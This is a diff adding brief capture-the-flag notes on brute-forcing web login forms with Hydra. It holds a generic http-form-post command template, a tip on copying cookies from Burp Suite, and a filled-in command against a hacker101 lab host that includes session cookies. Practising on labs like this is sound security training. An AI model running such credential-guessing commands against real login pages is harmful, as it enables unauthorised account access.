@@ -1,0 +1,12 @@
+HYDRA BRUTEFORCE ATTACK
+hydra targetIP http-form-post "urlpath:userformname=^USER^&passformname=^PASS^&Login=submit:login failed" -L usernames.txt -P passwords.txt
+
+
+hydra bruteforce attack 2
+http-get-form
+sometimes you must specify cookie value for hydra to work
+:H-Cookie: "
+**copy cookie value from target history on burpsuite
+
+
+sudo hydra 6578629dca39cc5f1fb1c8f6a55c6bec.ctf.hacker101.com http-form-post "/login:username=^USER^&password=^PASS^&Login=submit:Invalid username:H-Cookie: _ga=GA1.2.1360308037.1677808088; _gid=GA1.2.1421669196.1677808088; session=eyJjYXJ0IjpbXX0.ZAJXOQ.4kX14bS8TYeRG68uTLk8qD4ZhxY" -L usernames.txt -p purple
